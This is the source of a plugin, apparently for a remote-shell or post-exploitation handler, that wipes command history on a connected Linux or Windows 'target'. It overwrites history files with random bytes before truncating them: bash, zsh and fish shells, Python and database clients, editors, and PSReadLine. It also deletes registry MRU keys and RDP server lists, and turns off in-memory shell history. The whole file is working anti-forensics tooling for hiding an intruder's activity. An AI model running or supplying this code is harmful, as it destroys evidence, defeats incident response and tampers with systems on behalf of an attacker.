"""Cross-platform shell history clearing for the current user/session."""

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ...win_client import detect_windows_shell_kind
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_historydel_report, resolve_session_platform
from .runner import _run_collector_marked, parse_collector_json


def _linux_collector_source():
    return r'''
import os
import stat

env_info = {
    'USER': os.environ.get('USER', os.environ.get('LOGNAME', '')),
    'SHELL': os.environ.get('SHELL', ''),
    'HISTFILE': os.environ.get('HISTFILE', ''),
    'HISTSIZE': os.environ.get('HISTSIZE', ''),
    'HISTFILESIZE': os.environ.get('HISTFILESIZE', ''),
    'HOME': os.environ.get('HOME', ''),
}

home = os.path.expanduser('~')

candidates = []
histfile = env_info['HISTFILE']
if histfile:
    candidates.append(histfile)

candidates += [
    os.path.join(home, '.bash_history'),
    os.path.join(home, '.zsh_history'),
    os.path.join(home, '.sh_history'),
    os.path.join(home, '.history'),
    os.path.join(home, '.python_history'),
    os.path.join(home, '.node_repl_history'),
    os.path.join(home, '.mysql_history'),
    os.path.join(home, '.psql_history'),
    os.path.join(home, '.sqlite_history'),
    os.path.join(home, '.irb_history'),
    os.path.join(home, '.pry_history'),
    os.path.join(home, '.gdb_history'),
    os.path.join(home, '.lesshst'),
    os.path.join(home, '.viminfo'),
    os.path.join(home, '.local/share/fish/fish_history'),
    os.path.join(home, '.config/fish/fish_history'),
    os.path.join(home, '.local/share/atuin/history.db'),
    os.path.join(home, '.local/share/zoxide/db.zo'),
    os.path.join(home, '.ipython/profile_default/history.sqlite'),
    os.path.join(home, '.local/share/nvim/shada/main.shada'),
]

_seen = set()
_uniq = []
for p in candidates:
    if p and p not in _seen:
        _seen.add(p)
        _uniq.append(p)
candidates = _uniq

def _shred_truncate(path):
    try:
        st = os.stat(path)
        size = st.st_size
        if size > 0:
            chunk = os.urandom(min(size, 1 << 20))
            with open(path, 'r+b') as f:
                f.write(chunk)
                f.flush()
                try:
                    os.fsync(f.fileno())
                except OSError:
                    pass
        with open(path, 'r+b') as f:
            f.truncate(0)
            f.flush()
            try:
                os.fsync(f.fileno())
            except OSError:
                pass
        return size, None
    except Exception as exc:
        return None, str(exc)

cleared = []
failed = []
not_found = []

for path in candidates:
    if not path:
        continue
    if not os.path.lexists(path):
        not_found.append(path)
        continue
    if os.path.islink(path):
        failed.append({'path': path, 'error': 'symlink skipped'})
        continue
    try:
        st = os.stat(path)
    except Exception as exc:
        failed.append({'path': path, 'error': str(exc)})
        continue
    if not stat.S_ISREG(st.st_mode):
        failed.append({'path': path, 'error': 'not a regular file'})
        continue
    size_before, err = _shred_truncate(path)
    if err:
        failed.append({'path': path, 'error': err})
        continue
    try:
        size_after = os.path.getsize(path)
    except Exception:
        size_after = -1
    if size_after == 0:
        cleared.append(path)
    else:
        failed.append({'path': path,
                       'error': 'verify failed: size=%s' % size_after})

result = {
    'summary': {
        'Cleared': len(cleared),
        'Failed': len(failed),
        'NotFound': len(not_found),
        'User': env_info['USER'],
    },
    'cleared': cleared,
    'failed': failed,
    'not_found': not_found,
    'environment': env_info,
    'message': 'Shell history files securely truncated for current user',
}
_emit(result)
'''


def _build_linux_command():
    return build_linux_collector_command(_linux_collector_source())


def _build_windows_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$cleared=@(); $failed=@(); $notFound=@()

function Join-Safe([string]$a,[string]$b) {{
  if ([string]::IsNullOrEmpty($a)) {{ return $null }}
  return [System.IO.Path]::Combine($a,$b)
}}

$files = @()
$candidates = @(
  (Join-Safe $env:APPDATA     'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
  (Join-Safe $env:LOCALAPPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
  (Join-Safe $env:ProgramData 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
  (Join-Safe $env:USERPROFILE '.python_history'),
  (Join-Safe $env:USERPROFILE '.node_repl_history'),
  (Join-Safe $env:USERPROFILE '.psql_history'),
  (Join-Safe $env:USERPROFILE '.sqlite_history'),
  (Join-Safe $env:USERPROFILE '.viminfo'),
  (Join-Safe $env:USERPROFILE '.history'),
  (Join-Safe $env:LOCALAPPDATA 'clink\.history'),
  (Join-Safe $env:USERPROFILE 'cmd_history.log'),
  (Join-Safe $env:USERPROFILE 'cmd.log'),
  (Join-Safe $env:USERPROFILE 'commands.log')
)
foreach ($p in $candidates) {{ if ($p) {{ $files += $p }} }}

try {{
  Get-ChildItem -Path $env:USERPROFILE -Filter 'cmd_history*.log' -File -EA 0 |
    ForEach-Object {{ if ($files -notcontains $_.FullName) {{ $files += $_.FullName }} }}
}} catch {{}}

function Clear-HistoryFile([string]$p) {{
  try {{
    if (-not (Test-Path -LiteralPath $p -PathType Leaf)) {{
      return @{{missing=$true}}
    }}
    $item = Get-Item -LiteralPath $p -Force -EA Stop
    if ($item.IsReadOnly) {{ $item.IsReadOnly = $false }}
    $sizeBefore = $item.Length

    if ($sizeBefore -gt 0) {{
      $n = [Math]::Min([int64]$sizeBefore, 1MB)
      $bytes = New-Object 'byte[]' $n
      $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
      try {{ $rng.GetBytes($bytes) }} finally {{ $rng.Dispose() }}
      $fs = [System.IO.File]::Open($p, 'Open', 'Write', 'Read')
      try {{
        $fs.Write($bytes, 0, $bytes.Length)
        $fs.Flush()
        $fs.SetLength(0)
        $fs.Flush()
      }} finally {{ $fs.Close() }}
    }} else {{
      $fs = [System.IO.File]::Open($p, 'Open', 'Write', 'Read')
      try {{ $fs.SetLength(0); $fs.Flush() }} finally {{ $fs.Close() }}
    }}

    $after = (Get-Item -LiteralPath $p -Force).Length
    if ($after -eq 0) {{
      return @{{ok=$true; size_before=$sizeBefore}}
    }}
    return @{{ok=$false; error="verify failed: size=$after"}}
  }} catch {{
    return @{{ok=$false; error=$_.Exception.Message}}
  }}
}}

foreach ($p in $files) {{
  $r = Clear-HistoryFile $p
  if     ($r.ok)      {{ $cleared  += $p }}
  elseif ($r.missing) {{ $notFound += $p }}
  else                {{ $failed   += @{{path=$p; error=$r.error}} }}
}}

try {{ Clear-History -ErrorAction SilentlyContinue }} catch {{}}

$regKeys = @(
  @{{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU';         Label='RunMRU'}},
  @{{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths';     Label='TypedPaths'}},
  @{{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery'; Label='WordWheelQuery'}},
  @{{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps';       Label='RecentApps'}},
  @{{Path='HKCU:\Software\Microsoft\Terminal Server Client\Default';                 Label='RDP-Default'}},
  @{{Path='HKCU:\Software\Microsoft\Terminal Server Client\Servers';                 Label='RDP-Servers'}}
)
foreach ($k in $regKeys) {{
  try {{
    $key = Get-Item -Path $k.Path -EA 0
    if ($key) {{
      $names = @($key.GetValueNames() | Where-Object {{ $_ -ne '' }})
      foreach ($n in $names) {{
        Remove-ItemProperty -Path $k.Path -Name $n -EA 0
      }}
      $cleared += $k.Path
    }}
  }} catch {{
    $failed += @{{path=$k.Label; error=$_.Exception.Message}}
  }}
}}

$langMode = 'Unknown'
try {{ $langMode = $ExecutionContext.SessionState.LanguageMode.ToString() }} catch {{}}
$envInfo = [ordered]@{{
  USER         = $env:USERNAME
  COMPUTERNAME = $env:COMPUTERNAME
  ComSpec      = $env:ComSpec
  PSVersion    = $PSVersionTable.PSVersion.ToString()
  LanguageMode = $langMode
}}

$result=[ordered]@{{
  summary=@{{
    Cleared=$cleared.Count
    Failed=$failed.Count
    NotFound=$notFound.Count
    User=$env:USERNAME
  }}
  cleared=$cleared
  failed=$failed
  not_found=$notFound
  environment=$envInfo
  message='Shell and related history storage securely cleared for current user'
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _resolve_win_shell_kind(session: SessionContext) -> str:
    kind = (session._info or {}).get('win_shell')
    if kind in ('cmd', 'powershell'):
        return kind
    kind = detect_windows_shell_kind(session._handler, session._client_sock)
    session._info['win_shell'] = kind
    return kind


def _session_history_cleanup(session: SessionContext) -> str:
    platform = resolve_session_platform(session)
    if platform in ('unix', 'linux'):
        out = session.run_shell(
            'history -c 2>/dev/null; history -w 2>/dev/null; '
            'unset HISTFILE 2>/dev/null; '
            'export HISTSIZE=0 HISTFILESIZE=0 2>/dev/null; true',
            timeout=5.0,
        )
        if out is not None:
            return 'bash/zsh in-memory history cleared (HISTFILE unset, HISTSIZE=0)'
        return 'attempted'
    if platform == 'windows':
        shell_kind = _resolve_win_shell_kind(session)
        if shell_kind == 'cmd':
            session.run_shell('doskey /reinstall >nul 2>&1', timeout=5.0)
            return 'cmd.exe in-memory history cleared (doskey buffer reset)'
        session.run_marked(
            '',
            'Clear-History -ErrorAction SilentlyContinue; '
            'try { Remove-Module PSReadLine -Force -EA 0; '
            '      Import-Module PSReadLine -EA 0 } catch {}',
            timeout=5.0,
        )
        return 'PowerShell in-memory history cleared (PSReadLine reloaded)'
    return 'skipped'

def _confirm_or_abort(session: SessionContext, args) -> bool:
    assume_yes = False
    if args is not None:
        for flag in ('yes', 'y', 'force', 'f'):
            if getattr(args, flag, False):
                assume_yes = True
                break
    if assume_yes:
        session.print('--yes supplied, skipping confirmation.', 'yellow')
        return True
    try:
        answer = input("Do you want to continue? [y/N]: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        session.print('', 'yellow')
        return False
    return answer in ('y', 'yes')

@plugin.command(
    name='historydel',
    platforms=['linux', 'windows', 'unix'],
    description='Clear current user shell history files and related history storage',
)
def run(session: SessionContext, args):
    session.log_event('Plugin historydel: clear started')
    session.print('Clearing shell history for the current user/session.', 'yellow')
    session.print(
        'WARNING: this will truncate nearly every history file it can find on the target '
        '(shell, REPLs, database clients, editors, fish/Atuin/zoxide, PSReadLine, registry MRU, ...).',
        'red',
    )
    session.print('This action is destructive and cannot be undone.', 'red')

    if not _confirm_or_abort(session, args):
        session.print('Aborted by user.', 'yellow')
        session.log_plugin_result('historydel', '', 'aborted by user before execution')
        return 1
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    platform = resolve_session_platform(session)
    win_ps = ''
    unix_cmd = 'true'
    if platform == 'windows':
        win_ps = _build_windows_command()
    elif platform in ('unix', 'linux'):
        unix_cmd = _build_linux_command()
    else:
        win_ps = _build_windows_command()
        unix_cmd = _build_linux_command()
        platform = 'unknown'

    raw = _run_collector_marked(session, unix_cmd, win_ps, platform, 30.0)

    if raw is None:
        session.print("Plugin 'historydel' failed — no response from target.", 'red')
        session.log_plugin_result('historydel', '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print("Plugin 'historydel' failed — could not parse results.", 'red')
        session.log_plugin_result('historydel', raw[:4000], 'parse error')
        return 1

    if data.get('error'):
        session.print(f"Plugin 'historydel' error on target: {data['error']}", 'red')
        session.log_plugin_result('historydel', raw[:4000], data.get('traceback', ''))
        return 1

    data['session_cleanup'] = _session_history_cleanup(session)

    report = format_historydel_report(data)
    cleared = data.get('cleared') or []
    session.print(report, 'green' if cleared else 'yellow')

    failed = data.get('failed') or []
    if failed:
        session.print(f"Failures ({len(failed)}):", 'red')
        for f in failed[:10]:
            if isinstance(f, dict):
                session.print(f"  - {f.get('path', '?')}: {f.get('error', '?')}", 'red')
            else:
                session.print(f"  - {f}", 'red')
        if len(failed) > 10:
            session.print(f"  ... and {len(failed) - 10} more", 'red')

    not_found = data.get('not_found') or []
    if not_found:
        session.print(f"Not present ({len(not_found)}):", 'cyan')
        for p in not_found[:10]:
            session.print(f"  - {p}", 'cyan')
        if len(not_found) > 10:
            session.print(f"  ... and {len(not_found) - 10} more", 'cyan')

    env = data.get('environment') or {}
    if env:
        session.print("Environment:", 'cyan')
        for k, v in env.items():
            if v:
                session.print(f"  {k} = {v}", 'cyan')

    session.log_plugin_result('historydel', report, str(data))
    session.log_command('run historydel', report)
    return 0 if cleared or data.get('session_cleanup') else 1